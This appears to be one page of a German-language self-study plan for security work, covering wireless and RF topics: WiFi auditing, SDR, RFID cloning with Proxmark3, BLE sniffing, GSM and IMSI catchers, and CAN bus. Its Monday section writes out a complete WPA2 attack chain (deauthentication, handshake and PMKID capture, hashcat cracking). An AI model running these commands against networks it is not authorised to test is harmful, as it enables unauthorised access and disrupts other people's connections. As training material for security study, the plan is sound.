# MONAT 17 — WIRELESS/RF: SDR, GSM-Architektur, Proxmark3

## DAS LEVEL: Du verstehst die physische Schicht — Radio Frequencies, RFID, Wireless

---

## Monats-Ziele (nicht verhandelbar)
- [ ] SDR (Software Defined Radio): RTL-SDR + GNU Radio Grundlagen
- [ ] WiFi: Aircrack-ng Suite, WPA2 Handshake Capture, PMKID Attack
- [ ] Bluetooth/BLE: Ubertooth/nRF52840 Sniffing verstanden
- [ ] RFID: Proxmark3 für LF + HF Karten (lesen, klonen, emulieren)
- [ ] GSM: Architektur, IMSI Catcher Theorie, SIM-Karten
- [ ] Flipper Zero: Capabilities + Limitations verstanden
- [ ] Automotive: CAN Bus Grundlagen
- [ ] Hardware Lab aufgebaut (Proxmark3 + RTL-SDR + Flipper Zero)

---

## HARDWARE-EINKAUFSLISTE

| Tool | Preis | Priorität | Warum |
|------|-------|-----------|-------|
| Proxmark3 RDV4 | ~300€ | HOCH | RFID/NFC Research Standard |
| RTL-SDR V3 | ~30€ | HOCH | Einstieg in SDR (Empfang) |
| HackRF One | ~350€ | MITTEL | SDR mit Sendefähigkeit |
| Flipper Zero | ~170€ | MITTEL | Multi-Tool für RF/RFID/IR/NFC |
| WiFi Adapter (Alfa AWUS036ACH) | ~50€ | HOCH | Monitor Mode für WiFi Auditing |
| Ubertooth One | ~125€ | NIEDRIG | Bluetooth Sniffing |
| nRF52840 Dongle | ~10€ | MITTEL | BLE Sniffing (günstig) |

---

## WOCHE 65 — WIFI SECURITY + SDR

### Montag (Tag 449)

**06:30–08:30 | DEEP TECHNICAL: WiFi Attacks**
```bash
# WiFi Auditing mit Aircrack-ng
# 1. Monitor Mode aktivieren
sudo airmon-ng start wlan0

# 2. Netzwerke scannen
sudo airodump-ng wlan0mon

# 3. Auf Ziel-Netzwerk fokussieren + Handshake capturen
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon

# 4. Deauthentication (Client disconnecten → Handshake erzwingen)
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

# 5. Handshake cracken
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# PMKID Attack (kein Client nötig!)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=<BSSID> --filtermode=2
hcxpcapngtool pmkid.pcapng -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

**09:00–10:30 | PRAXIS: RTL-SDR Setup**
- RTL-SDR V3 anschließen
- GNU Radio installieren: `sudo apt install gnuradio`
- Oder: SDR# (Windows) / GQRX (Linux/Mac)
- Erste Übungen:
  1. FM Radio empfangen (Funktionstest)
  2. Flugzeuge tracken (ADS-B auf 1090 MHz): `dump1090 --interactive`
  3. Wetterstationen dekodieren (433 MHz ISM Band)
  4. Pager-Nachrichten empfangen (POCSAG)

**18:30–20:00 | DEEP LEARNING: GSM Architektur**
- Mobilfunk-Grundlagen für Investigatoren:
  - IMSI (International Mobile Subscriber Identity) — Eindeutige SIM-ID
  - TMSI (Temporary Mobile Subscriber Identity) — Temporäre ID
  - IMEI (International Mobile Equipment Identity) — Geräte-ID
  - HLR/VLR — Datenbanken die Location tracken
  - Authentication: Ki + RAND → SRES (Challenge-Response)
- IMSI Catcher Theorie:
  - Stingray/IMSI Catcher simuliert eine Basisstation
  - Telefone verbinden sich mit stärkstem Signal
  - Catcher liest IMSI, kann Traffic mitlesen (bei 2G)
  - 4G/5G: Schwerer aber nicht unmöglich (Downgrade-Attacks)
- Rechtslage Deutschland: §100i StPO erlaubt IMSI-Catcher für Strafverfolgung

---

## WOCHE 66-68 — RFID/NFC + AUTOMOTIVE + ADVANCED RF

### Woche 66: Proxmark3 Mastery
- LF (125 kHz): EM4100, HID ProxCard lesen + klonen
- HF (13.56 MHz): MIFARE Classic (Darkside + Nested Attack), MIFARE Ultralight
- NFC: Kontaktlos-Karten analysieren
- T5577 Magic Cards für LF-Kloning

### Woche 67: Bluetooth + BLE
- BLE Sniffing (nRF52840 oder Ubertooth)
- BLE MITM (GATTacker)
- Bluetooth-Tracking verstehen (BLE Beacons, AirTags)
- Apple Find My Netzwerk (OpenHaystack Research)

### Woche 68: Automotive + Capstone
- CAN Bus Grundlagen (Controller Area Network)
- OBD-II Interface verstehen
- Keyless Entry Relay Attacks (Theorie)
- Capstone: RF Security Assessment Report schreiben

---

## KPI-CHECKLISTE MONAT 17

| KPI | Ziel | Status |
|-----|------|--------|
| WiFi | Handshake Capture + PMKID | [ ] |
| SDR | RTL-SDR + ADS-B + FM | [ ] |
| Proxmark3 | LF + HF lesen/klonen | [ ] |
| MIFARE | Classic Attack (Darkside) | [ ] |
| GSM | IMSI/TMSI/Authentication | [ ] |
| BLE | Sniffing + Grundlagen | [ ] |
| CAN Bus | Grundlagen verstanden | [ ] |
| Hardware Lab | Aufgebaut + funktional | [ ] |
| Blog | RF Security Post | [ ] |
